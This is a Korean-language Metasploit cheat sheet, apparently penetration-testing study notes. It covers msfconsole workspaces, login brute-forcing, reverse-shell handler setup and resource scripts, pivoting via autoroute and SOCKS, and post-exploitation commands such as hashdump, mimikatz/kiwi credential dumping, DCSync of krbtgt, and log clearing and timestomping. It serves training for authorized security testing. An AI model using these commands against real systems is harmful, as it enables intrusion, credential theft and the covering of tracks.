# 11_Metasploit

# Metasploit — msfconsole 활용

---

## 1. DB / Workspace 관리

스캔 결과, 크리덴셔, 세션 이력을 자동으로 저장해두면 큰 규모 평가에서 특히 유용하다. 초기 설정 한 번만 해두면 이후 세션마다 재사용됨.

```bash
# 최초 1회 설정
sudo msfdb init
sudo systemctl start postgresql   # 이미 떠 있으면 생략

msfconsole
db_status                          # 연결 확인

# workspace로 평가 대상별 분리
workspace                          # 목록 확인 (* = 현재)
workspace -a <이름>                 # 새로 만들고 전환
workspace <이름>                    # 전환
workspace -d <이름>                 # 삭제

# nmap 결과를 DB에 자동 저장
db_nmap -sV -p- <IP>               # 일반 nmap과 옵션 동일
db_import scan.xml                 # 외부에서 이미 뚀 -oX 결과 가져오기

# 저장된 정보 조회
hosts                              # 발견한 호스트
services                           # 서비스/포트
vulns                              # 취약점
creds                              # 자동 수집된 크리덴셔 (auxiliary 로그인 스캐너 성공 시 자동 저장)
loot                               # 덤프한 파일/해시 등

# 리포트용 내보내기
db_export -f xml /root/scan.xml
```

---

## 2. 모듈 검색/사용 기본

```bash
search <키워드>                     # 예: search tomcat, search type:exploit smb
search cve:2021 platform:linux

use <모듈경로>                      # 예: use exploit/multi/handler
info                                # 현재 모듈 상세 설명
show options                        # 필요한 옵션 확인
show payloads                       # 이 exploit이 지원하는 페이로드 목록
show targets                        # 지원 대상 OS/버전 목록

set <옵션> <값>
# set Rhosts <IP>
# set Lhost tun0
# set RPORT <PORT>
setg <옵션> <값>                    # 전역 설정 (모듈 바꿔도 유지, LHOST 등에 유용)
unset <옵션>
unsetg <옵션>

run / exploit                       # 실행
exploit -j                          # 백그라운드로 실행 (핸들러 등)
back                                 # 현재 모듈에서 빠져나가기
```

---

## 3. Auxiliary 스캐너 활용

포트스캔뿐만 아니라 로그인 브루트포스, 정보 수집용 모듈도 이 카테고리.

```bash
# 로그인 브루트포스 (성공 시 creds에 자동 저장됨)
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts <IP>
set stop_on_success true
run

use auxiliary/scanner/ssh/ssh_login
set rhosts <IP>
set user_file users.txt
set pass_file passwords.txt
run

# 정보 수집형
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/portscan/tcp
set rhosts <대역>
set ports 1-1000
run
```

---

## 4. exploit/multi/handler — 리버스쉘 리스너

msfvenom으로 만든 페이로드를 실행시켰을 때 받는 쪽.

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp   # msfvenom과 동일한 페이로드로 맞출 것
set LHOST <칼리IP>
set LPORT 4444
set ExitOnSession false            # 세션 하나 받아도 리스너 계속 대기 (다수 타겟 노릴 때)
exploit -j                         # -j로 백그라운드 실행해야 다른 명령어 이어서 칠 수 있음
```

---

## 5. 세션 관리

```bash
sessions -l                        # 활성 세션 목록
sessions -i <ID>                   # 특정 세션으로 진입
sessions -k <ID>                   # 세션 종료
background                         # (세션 안에서) 현재 세션 백그라운드로 보내기, Ctrl+Z 도 동일

sessions -u <ID>                   # 일반 shell → meterpreter 업그레이드 시도
```

---

## 6. 피뱽팅 — autoroute + socks_proxy

이미 잡은 세션(Meterpreter)을 통해 msfconsole 안의 다른 모듈들이 내부망에 도달하게 만드는 방법. **msfconsole 내부 모듈에만 적용되고, 칼리의 일반 nmap 같은 외부 도구는 여전히 못 쓸** — 외부 도구까지 쓰려면 socks_proxy 모듈로 SOCKS 프록시를 추가로 열어야 한다.

```bash
# 방법 1 — post 모듈로 라우트 추가
use post/multi/manage/autoroute
set session <세션ID>
set subnet <내부대역>              # ← 수정, 예: 172.16.8.0
set netmask 255.255.255.0
run

# 방법 2 — meterpreter 안에서 직접
sessions -i <세션ID>
meterpreter > run autoroute -s <내부대역>/24

# 라우트 확인
route print

# msfconsole 밖 도구(nmap, curl 등)까지 쓰려면 SOCKS 프록시 추가로 열기
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# proxychains.conf 마지막 줄에 추가
socks5 127.0.0.1 1080
proxychains nmap ...               # 09_피버팅_터널링에서 다루었던 nmap+proxychains 구조적 한계가 여기도 동일하게 적용됨
```

---

## 7. Meterpreter 핵심 명령어 (post-exploitation)

```bash
getuid                             # 현재 권한 확인
sysinfo                            # OS/아키텍처 확인
getsystem                          # 알려진 로컬 privesc 기법 자동 시도 (Windows)

# 프로세스 이동 (안정성/권한 확보 목적)
ps                                  # 프로세스 목록
migrate <PID>                       # 예: lsass.exe로 이동 후 해시 덤프, 64비트 프로세스로 이동해야 kiwi 64비트 정상 작동

# 파일시스템
ls / cd / pwd / cat / download <원격경로> / upload <로컬경로> <원격경로>

# 크리덴셔 덤핑
hashdump                            # SAM 해시 (또는 run post/windows/gather/hashdump)
load kiwi                           # mimikatz 포팅 버전 (반드시 migrate로 64비트 프로세스 이동 후 로드)
creds_all                           # kiwi — 메모리상 평문 크리덴셔 전부
lsa_dump_sam                        # kiwi — LSA SAM
dcsync_ntlm krbtgt                  # kiwi — DCSync로 특정 계정 해시 획득 (DA 권한 필요)

# 흔적 정리
clearev                             # 이벤트 로그 삭제 (Windows)
timestomp <파일>                    # 파일 타임스탬프 조작
```

---

## 8. Resource Script — 반복 작업 자동화

매번 같은 set 시퀀스를 치는 대신 스크립트로 저장해서 한 번에 실행.

```bash
# handler.rc 예시
cat > handler.rc << 'EOF'
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <칼리IP>
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

msfconsole -r handler.rc            # 콘솔 시작하면서 바로 실행
# 또는 콘솔 안에서
resource handler.rc

# 커맨드라인에서 원라이너로 (스크립트 파일 없이)
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <칼리IP>; set LPORT 4444; exploit -j"
```